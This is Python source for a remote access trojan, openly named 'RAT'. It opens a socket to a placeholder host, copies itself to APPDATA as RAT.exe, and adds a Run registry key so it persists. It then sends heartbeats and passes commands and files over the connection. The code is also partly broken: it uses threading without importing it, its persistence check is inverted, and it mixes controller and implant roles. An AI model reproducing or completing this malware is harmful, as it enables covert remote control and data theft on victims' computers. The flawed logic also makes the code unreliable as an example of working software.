import os
import socket
import time
from winreg import *

def download_file(path):
    with open(path, 'wb') as file:
        while True:
            chunk = conn.recv(1024)
            if not chunk: break
            file.write(chunk)

def upload_file(path):
    with open(path, 'rb') as file:
        for byte in iter(lambda: file.read(1024), b''):
            conn.send(byte)

def command_line():
    while True:
        cmd = input('>>> ')
        if len(cmd) > 0:
            conn.send(cmd.encode())
            output = conn.recv(5120).decode()
            print(output)
            
def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('IP', PORT))
    except Exception as e:  
        s.close()
        os._exit(0)
    
    return s

def copy_to_hidden_path(path):
    import win32com.client
    shell = win32com.client.Dispatch("WScript.Shell")
    hidden_path = os.path.join(os.environ['APPDATA'], 'RAT.exe')
    shell.Run('copy /y "{}" "{}"'.format(path, hidden_path))
    
def add_run_key(hidden_path):
    key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
    SetValueEx(key, "RAT", 0, REG_SZ, hidden_path)
    CloseKey(key)

def heartbeat():
    while True:
        conn.send(b'Alive')
        time.sleep(5)

if __name__ == '__main__':
    conn = create_socket()

    if not os.path.exists('C:\\Windows\\System32'):
        copy_to_hidden_path(__file__)
        add_run_key(os.path.abspath(__file__))
    
    heartbeat_thread = threading.Thread(target=heartbeat)
    heartbeat_thread.daemon = True
    heartbeat_thread.start()
    
    while True:
        user_input = input('>> ')
        if 'download' in user_input:
            filename = user_input.split()[1]
            download_file(filename)
            print(f'{filename} downloaded.')
            
        elif 'upload' in user_input:
            filename = user_input.split()[1]
            upload_file(filename)
            print(f'{filename} uploaded.')
            
        else: 
            conn.send(user_input.encode())
            response = conn.recv(2048).decode()
            print(response)

